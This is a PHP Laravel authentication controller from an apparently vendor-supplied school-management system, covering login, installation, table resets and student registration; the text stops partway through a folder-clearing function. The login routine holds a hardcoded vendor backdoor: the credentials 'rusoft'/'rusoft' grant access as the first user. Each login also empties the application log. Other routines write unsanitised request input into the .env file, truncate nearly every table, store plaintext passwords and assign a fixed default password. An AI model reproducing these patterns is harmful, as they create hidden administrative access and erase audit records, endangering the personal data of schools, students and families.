<?php

namespace App\Http\Controllers\Auth;
use App\Models\User;
use App\Models\Teacher;
use App\Models\Student;
use App\Models\Admission;
use App\Models\State;
use App\Models\IPSetting;
use App\Models\WhatsappApiResponse;
use App\Models\OtpRequest;
use App\Models\Sessions;
use App\Models\Setting;
use App\Models\LoginLog;
use App\Models\BillCounter;
use App\Models\Master\Branch;
use App\Models\Master\MessageTemplate;
use App\Models\PermissionManagement;
use App\Models\Master\MessageType;
use Illuminate\Validation\Validator; 
use App\Helpers\helper;
use Session;
use Hash;
use Str;
use Redirect;
use Auth;
use DB;
use File;
use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Artisan;
use Illuminate\Support\Facades\Http;

class AuthController extends Controller
{
         public function newRegistration(Request $request){

        if($request->isMethod('post')){
            
            
              $url = asset('/');
         
         $mainDomainUrl = preg_replace('/\/+$/', '', $url);
    
       
        Session::flush();
        
        $response = Http::get('https://rukmanisoftware.com/api/checkInstallation/'.$request->softwareTokenNo);
        $status = 1;
        $domain = '';
        if($response->successful()){
            $data = $response->json();
        
            $status = $data['installation'];
            $domain = $data['domain'];
        }
        
    if($status == 0  && $mainDomainUrl == $domain){
           $filePath = base_path('.env');

            if (file_exists($filePath)) {
    
                $newToken = $request->softwareTokenNo;
                $newImageUploadPath = $request->imageUploadPath;
                $newImageShowPath = $request->imageShowPath;
                $newDBDatabase = $request->dbDatabase;
                $newDBUsername = $request->dbUsername;
                $newDBPassword = $request->dbPassword;
            
                $replacements = [
                    '/(SOFTWARE_TOKEN_NO=)[^\n\r]*/' => '${1}' . $newToken,
                    '/(IMAGE_UPLOAD_PATH=)[^\n\r]*/' => '${1}' . $newImageUploadPath,
                    '/(IMAGE_SHOW_PATH=)[^\n\r]*/' => '${1}' . $newImageShowPath,
                    '/(DB_DATABASE=)[^\n\r]*/' => '${1}' . $newDBDatabase,
                    '/(DB_USERNAME=)[^\n\r]*/' => '${1}' . $newDBUsername,
                    '/(DB_PASSWORD=)[^\n\r]*/' => '${1}' . $newDBPassword,
                ];
                
                file_put_contents($filePath, preg_replace(array_keys($replacements), array_values($replacements), file_get_contents($filePath)));
                
                
                 $this->clearTable($status='approved');
                 return redirect::to('setSidebar')->with('message','Table Truncate Successfully ');
                // return redirect::to('clearTable')->with('message', 'New registration request sent to RUKMANI SOFTWARE');
            }
        
    }
    else
{
    return redirect::to('login')->with('error','You are not authorized for this route.');  
}
            
            
            
          
        }
        
        return view('auth.newRegistration');
    }
    

        public function siblingList(Request $request){
            session()->forget('sibling_active');
             return redirect("/");
        }
       public function siblingLogin(Request $request, $id)
        {
            $getUser = Admission::find($id);
        
            if (!$getUser) {
                return redirect()->back()->with('error', 'Sibling not found! ');
            }
        
            // अगर account inactive है
            if ($getUser->status != 1) {
                return redirect()->back()->with('error', 'This account is inactive.');
            }
        
            $isStudent = true;
            session()->put('modal_name', 'Admission');
        
            // Session सेट करना
            $current_active_session_id = Setting::where('branch_id', $getUser->branch_id)
                ->value('current_active_session_id');
        
            if ($isStudent) {
                session()->put('session_id', $getUser->session_id);
            } else {
                session()->put('session_id', $current_active_session_id);
            }
        
            // बाकी user details session में डालना
            $request->session()->put([
                'id'         => $getUser->id,
                'name'       => $getUser->name,
                'email'      => $getUser->email,
                'branch_id'  => $getUser->branch_id,
                'userName'   => $getUser->userName,
                'first_name' => $getUser->first_name,
                'last_name'  => $getUser->last_name,
                'role_id'    => $getUser->role_id,
            ]);
        
            session()->put('class_type_id', $getUser->class_type_id);
            session()->put('sibling_active', 'yes');

            // remember token बनाना
            $rememberToken = bin2hex(random_bytes(32));
            $getUser->remember_token = $rememberToken;
            $getUser->save();
            cookie()->queue(cookie('remember_token', $rememberToken, 525600));
        
            $this->LoginLog($getUser->id, $getUser->first_name, $getUser->role_id);

            return redirect('/')->with('message', $getUser->first_name . ' login successful!');
        }

            
    public function getLogin(Request $request){
        if($request->isMethod('post')){
           // dd($request);
            $request->validate([
                'user_name' => 'required',
                'password' => 'required',
            ]);
            if (User::count() == 0) {
                return response()->json(['status' => 'error', 'message' => 'Please add a branch.']);
            }
            $this->logFile();
            // Default Admin Login
            if ($request->user_name === 'rusoft' && $request->password === 'rusoft') {
                $this->DefaultPassword();
                return response()->json(['status' => 'success', 'redirect_url' => '/','message'=>'Login Successfully !']);
            }
            $userData = User::where('userName', $request->user_name)->whereNotIn('role_id', [3])->first();
            $isStudent = false;
        
            if (!$userData) {
                $userData = Admission::where('userName', $request->user_name)->where('role_id', 3)->orderBy('id', 'DESC')->first();
                if ($userData) {
                    $isStudent = true;
                        session()->put('modal_name','Admission');
                }
            }
        
            if (!$userData) {
                return response()->json(['status' => 'error', 'user_name_error' => ' Error! User not found.']);
            }
        
            // Check user status
            if ($userData->status != 1) {
                return response()->json(['status' => 'error', 'message' => 'Your login details are inactive. Please contact Admin.']);
            }
        
            // Verify password
            if (!Hash::check($request->password, $userData->password)) {
                return response()->json(['status' => 'error', 'password_error' => 'Invalid password. please try again']);
            }
                $current_active_session_id = Setting::where('branch_id', $userData->branch_id)->first(['current_active_session_id']);
        
                $attendanceUniqueId = trim((string) ($userData->attendance_unique_id ?? ''));

            if ($isStudent) {
                session()->put('session_id', $userData->session_id);
            }else{
                session()->put('session_id', $current_active_session_id->current_active_session_id);
            }
                // Set session variables
                    $request->session()->put([
                        'id' => $userData->id,
                        'name' => $userData->name,
                        'email' => $userData->email,
                        'teacher_id' => $userData->teacher_id,
                        'branch_id' => $userData->branch_id,
                        'userName' => $userData->userName,
                        'first_name' => $userData->first_name,
                        'last_name' => $userData->last_name,
                        'role_id' => $userData->role_id,
                        'attendance_unique_id' => $attendanceUniqueId,
                    ]);
                session()->put('class_type_id', $userData->class_type_id);
                session()->put('attendance_unique_id', $attendanceUniqueId);        
        
            $loginWithOtp = Setting::find(1)->loginWithOtp ?? 'No';
            if ($loginWithOtp === 'Yes') {
                return response()->json(['status' => 'success', 'redirect_url' => route('auth.otpDiv')]);
            }
        
            $branch = Branch::find($userData->branch_id);
            if (!$branch || !$branch->branch_sidebar_id) {
                return response()->json(['status' => 'error', 'message' => 'Please set sidebar.']);
            }
            // Generate remember token
            $rememberToken = bin2hex(random_bytes(32)); 
            $userData->remember_token = $rememberToken; 
            $userData->save();
            cookie()->queue(cookie('remember_token', $rememberToken, 525600));
            $this->LoginLog($userData->id,$userData->first_name,$userData->role_id);
            
            return response()->json(['status' => 'success', 'redirect_url' => '/','message'=>'Login Successfully !']);
            }
        return view('auth/login');        
    }
    
    public function logFile(){
        $logFile = storage_path('logs/laravel.log');
        if (File::exists($logFile)) {
            File::put($logFile, ''); 
        } 
    }

    public function LoginLog($id,$name,$role_id){
     	$log  = new LoginLog;//model name
     	$log->user_id = Session::get('id');
        $log->session_id = Session::get('session_id');
        $log->branch_id = Session::get('branch_id');
		$log->ip_address =request()->ip();
		$log->name = $name;
		$log->role_id = $role_id;
        $log->save();
    }

    public function DefaultPassword(){
        $userData = User::get()->first();
        session()->put('id',$userData->id);
        session()->put('name',$userData->name);
        session()->put('email',$userData->email);
        session()->put('teacher_id',$userData->teacher_id);
        session()->put('admin_branch_id',null);
        $current_active_session_id = Setting::where('branch_id',$userData->branch_id)->first(['current_active_session_id']);
        session()->put('session_id',$current_active_session_id->current_active_session_id);
        session()->put('branch_id',$userData->branch_id);
        session()->put('userName',$userData->userName);
        session()->put('first_name',$userData->first_name);
        session()->put('last_name',$userData->last_name);
        session()->put('father_name',$userData->father_name);
        session()->put('mother_name',$userData->mother_name);
        session()->put('mobile',$userData->mobile);
        session()->put('countries_id',$userData->countries_id);
        session()->put('state_id',$userData->state_id);
        session()->put('city_id',$userData->city_id);
        session()->put('photo',$userData->photo);
        session()->put('regisUniqueId',$userData->regisUniqueId);
        session()->put('role_id',$userData->role_id);
        session()->put('created_at',$userData->created_at);
        session()->put('edit',$userData->edit);
        session()->put('class_type_id',$userData->class_type_id);
        // !! start session validation
        $checkSessionUser = User::where('userName',$userData->userName)->where('role_id',$userData->role_id)
                            ->get()->first();
        if($checkSessionUser){
            $branch = Branch::find(Session::get('branch_id'));
            if($branch->branch_sidebar_id == "" || $branch->branch_sidebar_id == 0){
                return redirect("setSidebar");
            }else{
                return redirect("/")->with('message','Login Successfully !');
            }
        }
    }

	public function logout() {
        Auth::logout();
            //Delete all cookies
            foreach ($_COOKIE as $key => $value) {
                \Cookie::queue(\Cookie::forget($key));
            }
        Session::flush();
        return redirect("login")->with('message','Logout successfully!'); 
    }

   
  
    
    


    public function validateOtp(Request $request){
        if($request->isMethod('POST')){
            
            $data = OtpRequest::where('id',1)->where('otp',$request->otp)->first();
            if(!empty($data))
            {
                 return response()->json(['status'=>1]);
            }
            else
            {
                 return response()->json(['status'=>0]);
            }
        }
    }
    public function setSidebar(Request $request){
        
        $session_clearTable = Session::get('clearTable');
       
        if($request->isMethod('POST')){
            $otp = mt_rand(1000, 9999);
            $domain =$request->domain ?? '';
            $email = ['skwork91@gmail.com','veonkumawat@gmail.com'];
            $emailData = ['email'=>$email,'otp'=>$otp,'subject'=>'🤫 OTP For New Installation of School Software 🗝','domain'=>$domain];
            $whatsapp = "🤫 _OTP For New Installation of School Software_ *" . $otp . "* 🗝️";
            Helper::sendMail('auth.new_installation',$emailData);
            //Helper::sendWhatsappMessage('8949868687', $whatsapp);
            //Helper::sendWhatsappMessage('8209949186', $whatsapp);
            
            $data ='';
            $checkOtp = OtpRequest::count();
            if($checkOtp > 0)
            {
                $data = OtpRequest::find(1);
            }
            else
            {
                $data = new OtpRequest;
            }
            
            $data->domain = $domain;
            $data->request_from = 'New Installation';
            $data->otp = $otp;
            $data->save();
            return response()->json(['status'=>1]);
        }        
        
        if($session_clearTable != 'approved')
        {
            return redirect("admin/login")->with('error','Approval from clear table route is missing.');
        }
        else{
            return view('auth.setSidebar');
        }
    }
    
    public function allowSidebar(Request $request){
        $sidebar_sub_id ='';
        if($request->isMethod('POST')){
		$sidebar_id = implode(',', $request->sidebar_id);
        $sidebar_sub_id = implode(',', $request->sidebar_sub_id);
		
        $addbranch  = new Branch;//model name
		$addbranch->branch_code =$request->branch_code;
		$addbranch->branch_name = $request->branch_name;
		$addbranch->contact_person  = $request->contact_person;
		$addbranch->mobile  = $request->mobile;
		$addbranch->email = $request->email;
		$addbranch->branch_count = $request->branch_count;
		$addbranch->address = $request->address;
		$addbranch->sms_srvc = $request->email_status;
		$addbranch->email_srvc = $request->sms_status;
		$addbranch->whatsapp_srvc = $request->whatsapp_status;
		$addbranch->branch_sidebar_id = $sidebar_id;
		$addbranch->sidebar_sub_id = $sidebar_sub_id;
        $addbranch->save();
        
        $branch_id =$addbranch->id;
    		    
	    $addUesrs = new User;//model name
	    
	    $addUesrs->session_id = $request->session_id;
        $addUesrs->branch_id = $branch_id;
	    $addUesrs->userName =$request->user_name;
		$addUesrs->first_name = $request->contact_person;
		$addUesrs->email = $request->email;
		$addUesrs->mobile  = $request->mobile;
		$addUesrs->address = $request->address;
		$addUesrs->role_id = $request->role_id;
		$addUesrs->status  = 1;
		$addUesrs->password  =  Hash::make($request->password);
		$addUesrs->confirm_password  = $request->password;
		$addUesrs->save();
		
        $add_pr = new PermissionManagement;//model name
		$add_pr->user_id = 1;
		$add_pr->reg_user_id = $addUesrs->id;
		$add_pr->sidebar_id =$sidebar_id;
		$add_pr->sidebar_sub_id =$sidebar_sub_id;
		$add_pr->add  =1;
		$add_pr->edit  = 1;
		$add_pr->deletes  =1;     		
		$add_pr->download  = 1;     		
		$add_pr->save(); 
    		
			
		$Counter[] = 'Teacher';
		$Counter[] = 'StudentRegistration';
		$Counter[] = 'StudentAdmission';
		$Counter[] = 'FeesSlip';
		$Counter[] = 'LibraryId';
		$Counter[] = 'HostelFees';
		$Counter[] = 'Hostel';
		
        $dataSession = Sessions::get();
        if(!empty($dataSession)){
            foreach($dataSession as $val){
                foreach($Counter as $val2){
                    $bill = new BillCounter;
                    $bill->user_id = $addUesrs->id;
                    $bill->branch_id = $branch_id;
                    $bill->session_id =$val->id;
                    $bill->type = $val2;
                    $bill->counter = 0;
                    $bill->save();
                } 
            }
        }
			
		$add_setting = new Setting;//model name
		$add_setting->user_id = $addUesrs->id;
		$add_setting->session_id = $request->session_id;
		$add_setting->current_active_session_id = $request->session_id;
		$add_setting->role_id = $request->role_id;
        $add_setting->branch_id = $branch_id;
		$add_setting->name = $addbranch->branch_name;
		$add_setting->mobile  = $addbranch->mobile;
		$add_setting->gmail = $addbranch->email;
		$add_setting->country_id = 101;
		$add_setting->state_id = 33;
		$add_setting->address  = $addbranch->address;
	    $add_setting->save();
		
            return redirect("login")->with('message','Login Successfully !');
        }
        return view('auth.allowSidebar');
    }
    
    public function clearTable($status=null){
        if($status == 'approved'){
            File::deleteDirectory(env('IMAGE_UPLOAD_PATH').'Signature_img');
            File::deleteDirectory(env('IMAGE_UPLOAD_PATH').'Signature1_img');
            File::deleteDirectory(env('IMAGE_UPLOAD_PATH').'Signature2_img');
            File::deleteDirectory(env('IMAGE_UPLOAD_PATH').'Signature3_img');
            File::deleteDirectory(env('IMAGE_UPLOAD_PATH').'banner_image');
            File::deleteDirectory(env('IMAGE_UPLOAD_PATH').'Book_img'); 
            File::deleteDirectory(env('IMAGE_UPLOAD_PATH').'bus_photo');
            File::deleteDirectory(env('IMAGE_UPLOAD_PATH').'college_id');
            File::deleteDirectory(env('IMAGE_UPLOAD_PATH').'covid_certificate');
            File::deleteDirectory(env('IMAGE_UPLOAD_PATH').'download_center');
            File::deleteDirectory(env('IMAGE_UPLOAD_PATH').'earing_products');
            File::deleteDirectory(env('IMAGE_UPLOAD_PATH').'expense');
            File::deleteDirectory(env('IMAGE_UPLOAD_PATH').'expense_bill');
            File::deleteDirectory(env('IMAGE_UPLOAD_PATH').'father_adhar');
            File::deleteDirectory(env('IMAGE_UPLOAD_PATH').'father_image');
            File::deleteDirectory(env('IMAGE_UPLOAD_PATH').'father_photo');
            File::deleteDirectory(env('IMAGE_UPLOAD_PATH').'guardian_photo');
            File::deleteDirectory(env('IMAGE_UPLOAD_PATH').'homework');
            File::deleteDirectory(env('IMAGE_UPLOAD_PATH').'hostel');
            File::deleteDirectory(env('IMAGE_UPLOAD_PATH').'library');
            File::deleteDirectory(env('IMAGE_UPLOAD_PATH').'mother_photo');
            File::deleteDirectory(env('IMAGE_UPLOAD_PATH').'mother_image');
            File::deleteDirectory(env('IMAGE_UPLOAD_PATH').'other_document');
            File::deleteDirectory(env('IMAGE_UPLOAD_PATH').'parmanent');
            File::deleteDirectory(env('IMAGE_UPLOAD_PATH').'photo');
            File::deleteDirectory(env('IMAGE_UPLOAD_PATH').'police_verification');
            File::deleteDirectory(env('IMAGE_UPLOAD_PATH').'profile');
            File::deleteDirectory(env('IMAGE_UPLOAD_PATH').'school_gallery');
            File::deleteDirectory(env('IMAGE_UPLOAD_PATH').'setting');
            File::deleteDirectory(env('IMAGE_UPLOAD_PATH').'student_image');
            File::deleteDirectory(env('IMAGE_UPLOAD_PATH').'teacher');
            File::deleteDirectory(env('IMAGE_UPLOAD_PATH').'uniform_image');
            File::deleteDirectory(env('IMAGE_UPLOAD_PATH').'uploadHomework');
            File::deleteDirectory(env('IMAGE_UPLOAD_PATH').'user');
            File::deleteDirectory(env('IMAGE_UPLOAD_PATH').'student_id_proof');
            File::deleteDirectory(env('IMAGE_UPLOAD_PATH').'Signature4_img');
            File::deleteDirectory(env('IMAGE_UPLOAD_PATH').'chat');
            File::deleteDirectory(env('IMAGE_UPLOAD_PATH').'student_document');
            File::deleteDirectory(env('IMAGE_UPLOAD_PATH').'whatsapp_documents');
            File::deleteDirectory(env('IMAGE_UPLOAD_PATH').'uplode_qr');
            File::deleteDirectory(env('IMAGE_UPLOAD_PATH').'Sudent_Id_img');
            File::deleteDirectory(env('IMAGE_UPLOAD_PATH').'studentIdPdf');
            File::deleteDirectory(env('IMAGE_UPLOAD_PATH').'student_expence_bill');
            File::deleteDirectory(env('IMAGE_UPLOAD_PATH').'fees_receipt_pdf');
            File::deleteDirectory(env('IMAGE_UPLOAD_PATH').'expense');
            File::deleteDirectory(env('IMAGE_UPLOAD_PATH').'certificates_images');
            File::deleteDirectory(env('IMAGE_UPLOAD_PATH').'payment_receipt');


            
            DB::table('accounts')->truncate();
            DB::table('admissions')->truncate();
            DB::table('admit_cards')->truncate();
            DB::table('admit_card_note')->truncate();
            DB::table('all_subjects')->truncate();
            DB::table('assign_books')->truncate();
            DB::table('assign_exams')->truncate();
            DB::table('assign_questions')->truncate();
            DB::table('bill_counters')->truncate();
            DB::table('birthday_wishes')->truncate();
            DB::table('books_uniform_shops')->truncate();
            DB::table('book_invoices')->truncate();
            DB::table('branch')->truncate();
            DB::table('bus')->truncate();
            DB::table('bus_assign_students')->truncate();
            DB::table('bus_route')->truncate();
            DB::table('bus_route_assign')->truncate();
            DB::table('chapters_digital')->truncate();
            DB::table('chats')->truncate();
            DB::table('class_types')->truncate();
            DB::table('complaint')->truncate();
            DB::table('c_certificates_form')->truncate();
            DB::table('download_center')->truncate();
            DB::table('electricity_bill_payments')->truncate();
            DB::table('email_records')->truncate();
            DB::table('enquirys')->truncate();
            DB::table('evente_certificates')->truncate();
            DB::table('event_management')->truncate();
            DB::table('examination_admit_cards')->truncate();
            DB::table('examination_schedules')->truncate();
            DB::table('exams')->truncate();
            DB::table('exams_digital')->truncate();
            DB::table('exam_patterns_digital')->truncate();
            DB::table('exam_results')->truncate();
            DB::table('exam_results_digital')->truncate();
            DB::table('exam_result_details')->truncate();
            DB::table('exam_setting_digital')->truncate();
            DB::table('expenses')->truncate();
            DB::table('failed_jobs')->truncate();
            DB::table('failed_messages')->truncate();
            DB::table('fees_assign_details')->truncate();
            DB::table('fees_collect')->truncate();
            DB::table('fees_detail')->truncate();
            DB::table('fees_group')->truncate();
            DB::table('fees_master')->truncate();
            DB::table('fill_marks')->truncate();
            DB::table('fill_min_max_marks')->truncate();
            DB::table('food_menu_lists')->truncate();
            DB::table('gallery')->truncate();
            DB::table('gate_passes')->truncate();
            DB::table('heads')->truncate();
            DB::table('holidays')->truncate();
            DB::table('homeworks')->truncate();
            DB::table('homework_documents')->truncate();
            DB::table('homework_review')->truncate();
            DB::table('hostel')->truncate();
            DB::table('hostel_assign')->truncate();
            DB::table('hostel_bed')->truncate();
            DB::table('hostel_building')->truncate();
            DB::table('hostel_expences')->truncate();
            DB::table('hostel_floor')->truncate();
            DB::table('hostel_meter_units')->truncate();
            DB::table('hostel_room')->truncate();
            DB::table('hourly_homework')->truncate();
            DB::table('hourly_upload_homeworks')->truncate();
            DB::table('inventorys')->truncate();
            DB::table('inventory_details')->truncate();
            DB::table('inventory_items')->truncate();
            DB::table('inventory_sales')->truncate();
            DB::table('inventory_sale_details')->truncate();
            DB::table('invoices')->truncate();
            DB::table('jobs')->truncate();
            DB::table('leave_management')->truncate();
            DB::table('levels_digital')->truncate();
            DB::table('librarys')->truncate();
            DB::table('library_assign')->truncate();
            DB::table('library_books')->truncate();
            DB::table('library_cabins')->truncate();
            DB::table('library_categarys')->truncate();
            DB::table('library_lockers')->truncate();
            DB::table('library_plans')->truncate();
            DB::table('library_time_slots')->truncate();
            DB::table('mess_fees_strucher')->truncate();
            DB::table('mess_food_categorys')->truncate();
            DB::table('mess_food_routine')->truncate();
            DB::table('notice_board')->truncate();
            DB::table('online_payment_transactions')->truncate();
            DB::table('pelantys')->truncate();
            DB::table('permission_managements')->truncate();
            DB::table('prayers')->truncate();
            DB::table('questions')->truncate();
            DB::table('questions_digital')->truncate();
            DB::table('question_types_digital')->truncate();
            DB::table('recycle_bins')->truncate();
            DB::table('registration_remarks')->truncate();
            DB::table('registration_terms')->truncate();
            DB::table('rules')->truncate();
            DB::table('school_calender')->truncate();
            DB::table('school_desk')->truncate();
            DB::table('security_deposit')->truncate();
            DB::table('sell_invantory_items')->truncate();
            DB::table('sell_inventory')->truncate();
            DB::table('settings')->truncate();
            DB::table('sms_settings')->truncate();
            DB::table('sports')->truncate();
            DB::table('sports_certificates')->truncate();
            DB::table('staff_salarys')->truncate();
            DB::table('staff_salary_details')->truncate();
            DB::table('strok')->truncate();
            DB::table('student_attendance')->truncate();
            DB::table('student_expenses')->truncate();
            DB::table('student_expense_details')->truncate();
            DB::table('subject')->truncate();
            DB::table('tc_certificates')->truncate();
            DB::table('teachers')->truncate();
            DB::table('teachers_accounts')->truncate();
            DB::table('teacher_attendance')->truncate();
            DB::table('teacher_documents')->truncate();
            DB::table('teacher_subjects')->truncate();
            DB::table('time_periods')->truncate();
            DB::table('time_tables')->truncate();
            DB::table('topics_digital')->truncate();
            DB::table('total_days')->truncate();
            DB::table('to_do_list')->truncate();
            DB::table('uniforms')->truncate();
            DB::table('upload_bys_digital')->truncate();
            DB::table('upload_homeworks')->truncate();
            DB::table('users')->truncate();
            DB::table('whatsapp_groups')->truncate();
            DB::table('fees_details_invoices')->truncate();
            DB::table('fees_assign_details')->truncate();
            DB::table('fees_advances')->truncate();
            DB::table('fees_advance_historys')->truncate();
            Session::put('clearTable','approved');
        
        
        }
        else
        {
            return redirect::to('admin/login')->with('error','You are not authorized for this route.');  
        }
    }
    
    protected function unique_system_id($id){
        $uniqueId = strtoupper(Str::random(10));
        Admission::where('id',$id)->whereNull('unique_system_id')->update(['unique_system_id' => $uniqueId]);
    }
    
    
    public function newStudentRegistration(Request $request){
        
        if ($request->isMethod('post')) {
      
            $student_image = '';
            if ($request->file('student_img')) {
                $image = $request->file('student_img');
                $path = $image->getRealPath();
                $student_image = time() . uniqid() . $image->getClientOriginalName();
                $destinationPath = env('IMAGE_UPLOAD_PATH') . 'profile';
                $image->move($destinationPath, $student_image);
            }

            $father_image = '';
            if ($request->file('father_img')) {
                $image = $request->file('father_img');
                $path = $image->getRealPath();
                $father_image = time() . uniqid() . $image->getClientOriginalName();
                $destinationPath = env('IMAGE_UPLOAD_PATH') . 'father_image';
                $image->move($destinationPath, $father_image);
            }

            $mother_image = '';
            if ($request->file('mother_img')) {
                $image = $request->file('mother_img');
                $path = $image->getRealPath();
                $mother_image = time() . uniqid() . $image->getClientOriginalName();
                $destinationPath = env('IMAGE_UPLOAD_PATH') . 'mother_image';
                $image->move($destinationPath, $mother_image);
            }

           $setting = Setting::first();
            $addadmission = new Admission(); //model name
            $addadmission->user_id = $setting->user_id;
            $addadmission->session_id = $setting->current_active_session_id;
            $addadmission->branch_id = $setting->branch_id;
            $addadmission->admissionNo = $request->admissionNo;
            $addadmission->ledger_no = $request->ledger_no;
            $addadmission->school = '1';
            $addadmission->library = '0';
            $addadmission->hostel = '0';
            $addadmission->roll_no = $request->roll_no;
            $addadmission->admission_type_id = $request->admission_type_id;
            $addadmission->class_type_id = $request->class_type_id;
            
            if(!empty($request->stream_subject)){
                $addadmission->stream_subject = implode(',', $request->stream_subject);
            }
            
            $addadmission->first_name = $request->first_name;
            $addadmission->last_name = $request->last_name;
            $addadmission->aadhaar = $request->aadhaar;
            $addadmission->email = $request->email;
            $addadmission->mobile = $request->mobile;
            $addadmission->father_name = $request->father_name;
            $addadmission->mother_name = $request->mother_name;
            $addadmission->father_mobile = $request->father_mobile;
            $addadmission->dob = $request->dob;
            $addadmission->house = $request->house;
            $addadmission->height = $request->height;
            $addadmission->weight = $request->weight;
            $addadmission->gender_id = $request->gender_id;
            $addadmission->admission_type_id = $request->admission_type_id;
            $addadmission->blood_group = $request->blood_group;
            $addadmission->address = $request->address;
            $addadmission->country_id = $request->country;
            $addadmission->village_city = $request->village_city;
            $addadmission->city_id = $request->city;
            $addadmission->state_id = $request->state;
            $addadmission->pincode = $request->pincode;
            $addadmission->family_id = $request->family_id;
            $addadmission->srn = $request->srn;
            $addadmission->religion = $request->religion;
            $addadmission->category = $request->category;
            $addadmission->caste_category = $request->caste_category;
            $addadmission->transport = $request->transport;
            $addadmission->bus_number = $request->bus_number;
            $addadmission->bus_route = $request->bus_route;
            $addadmission->stoppage = $request->stoppage;
            $addadmission->transpor_charges = $request->transpor_charges;
            $addadmission->guardian_name = $request->guardian_name;
            $addadmission->guardian_mobile = $request->guardian_mobile;
            $addadmission->mother_mob = $request->mother_mob;
            $addadmission->father_aadhaar = $request->father_aadhaar;
            $addadmission->mother_aadhaar = $request->mother_aadhaar;
            $addadmission->family_annual_income = $request->family_annual_income;
            $addadmission->bank_account = $request->bank_account;
            $addadmission->bank_name = $request->bank_name;
            $addadmission->branch_name = $request->branch_name;
            $addadmission->ifsc = $request->ifsc;
            $addadmission->micr_code = $request->micr_code;
            $addadmission->image = $student_image;
            $addadmission->father_img = $father_image;
            $addadmission->mother_img = $mother_image;
            $addadmission->remark_1 = $request->remark_1;
            $addadmission->bank_account_holder = $request->bank_account_holder;
            $addadmission->optional_subject = $request->optional_subject;
            $addadmission->urban = $request->urban;
            $addadmission->district = $request->district;
            $addadmission->tehsil = $request->tehsil;
            $addadmission->father_pancard = $request->father_pancard;
            $addadmission->mother_pancard = $request->mother_pancard;
            $addadmission->income_tax_payee_father = $request->income_tax_payee_father;
            $addadmission->income_tax_payee_mother = $request->income_tax_payee_mother;
            $addadmission->bpl = $request->bpl;
            $addadmission->bpl_certificate_no = $request->bpl_certificate_no;
            $addadmission->father_occupation = $request->father_occupation;
            $addadmission->mother_occupation = $request->mother_occupation;
            $addadmission->password = Hash::make('12345678');
            $addadmission->confirm_password = '12345678';
            
                $status = 3;
           
            $addadmission->status = $status;
            
            
            $session = Sessions::where('id',$setting->current_active_session_id)->first();
            $initials = substr($request->first_name, 0, 4);
            $birthYear = date('Y', strtotime($request->dob));
            $cleanedMobile = preg_replace('/[^0-9]/', '', $request->mobile);

            $username = substr($setting->name, 0,4).'_'.strtoupper($initials)  .'_'. substr($cleanedMobile, -4).'_'.$session->from_year;
            
            $addadmission->userName = $username;
            
            $addadmission->save();
            
            $this->unique_system_id($addadmission->id);
        
            // $template =  MessageTemplate::Select('message_templates.*','message_types.slug')
            //                 ->leftjoin('message_types','message_types.id','message_templates.message_type_id')
            //               ->where('message_types.status',1)->where('message_types.slug','student-admission')->first();
            
            
            
            $template = "
Subject: Confirmation of Registration Request

Dear {#name#},

We have received your registration application. Thank you for choosing to join {#school_name#}. Our administrators will now verify your details. Once your registration is verified, you will receive your login credentials shortly.

If you have any questions in the meantime, please feel free to reach out to us.

Best regards,
Administrator
{#school_name#}
";
            $branch = Branch::find(1);
            $setting = Setting::where('branch_id',1)->first();
        $arrey1 =   array(
                        '{#name#}',
                        '{#school_name#}',
                        '{#user_name#}',
                        '{#password#}',
                        '{#email#}',
                        '{#mobile#}',);
                       
        $arrey2 = array(
                        $request->first_name." ".$request->last_name,
                        $setting->name,
                        $request->mobile,
                        "12345678",
                        $request->email,
                        $request->mobile);
                        
                    
                
                            
                            if($branch->whatsapp_srvc != 0){
                                if ($request->mobile != ""){
                                       $whatsapp = str_replace($arrey1,$arrey2,$template);
                                        Helper::sendWhatsappMessage($request->mobile,$whatsapp);
                                    
                                }
                            }
                            
                              
                
                    
                 
            return redirect::to('redirection')->with('message', 'Admission form applied Successfully.');
                
        }
    
        
        return view('students.admission.newStudentRegistration');
    }
    
    public function redirection(Request $request){
        return view('redirect.redirect');
    }
    
    
    public function folderClear(){
        File::deleteDirectory(env('IMAGE_UPLOAD_PATH').'Signature_img');
        File::deleteDirectory(env('IMAGE_UPLOAD_PATH').'Signature1_img');
        File::deleteDirectory(env('IMAGE_UPLOAD_PATH').'Signature2_img');
        File::deleteDirectory(env('IMAGE_UPLOAD_PATH').'Signature3_img');
        File::deleteDirectory(env('IMAGE_UPLOAD_PATH').'banner_image');
        File::deleteDirectory(env('IMAGE_UPLOAD_PATH').'Book_img'); 
        File::deleteDirectory(env('IMAGE_UPLOAD_PATH').'bus_photo');
        File::deleteDirectory(env('IMAGE_UPLOAD_PATH').'college_id');
        File::deleteDirectory(env('IMAGE_UPLOAD_PATH').'covid_certificate');
        File::deleteDirectory(env('IMAGE_UPLOAD_PATH').'download_center');
        File::deleteDirectory(env('IMAGE_UPLOAD_PATH').'earing_products');
        File::deleteDirectory(env('IMAGE_UPLOAD_PATH').'expense');
        File::deleteDirectory(env('IMAGE_UPLOAD_PATH').'expense_bill');
        File::deleteDirectory(env('IMAGE_UPLOAD_PATH').'father_adhar');
        File::deleteDirectory(env('IMAGE_UPLOAD_PATH').'father_image');
        File::deleteDirectory(env('IMAGE_UPLOAD_PATH').'father_photo');
        File::deleteDirectory(env('IMAGE_UPLOAD_PATH').'guardian_photo');
        File::deleteDirectory(env('IMAGE_UPLOAD_PATH').'homework');
        File::deleteDirectory(env('IMAGE_UPLOAD_PATH').'hostel');
        File::deleteDirectory(env('IMAGE_UPLOAD_PATH').'library');
        File::deleteDirectory(env('IMAGE_UPLOAD_PATH').'mother_photo');
        File::deleteDirectory(env('IMAGE_UPLOAD_PATH').'mother_image');
        File::deleteDirectory(env('IMAGE_UPLOAD_PATH').'other_document');
        File::deleteDirectory(env('IMAGE_UPLOAD_PATH').'parmanent');
        File::deleteDirectory(env('IMAGE_UPLOAD_PATH').'photo');
        File::deleteDirectory(env('IMAGE_UPLOAD_PATH').'police_verification');
        File::deleteDirectory(env('IMAGE_UPLOAD_PATH').'profile');
        File::deleteDirectory(env('IMAGE_UPLOAD_PATH').'school_gallery');
        File::deleteDirectory(env('IMAGE_UPLOAD_PATH').'setting');
        File::deleteDirectory(env('IMAGE_UPLOAD_PATH').'student_image');
        File::deleteDirectory(env('IMAGE_UPLOAD_PATH').'teacher');
        File::deleteDirectory(env('IMAGE_UPLOAD_PATH').'uniform_image');
        File::deleteDirectory(env('IMAGE_UPLOAD_PATH').'uploadHomework');
        File::deleteDirectory(env('IMAGE_UPLOAD_PATH').'user');
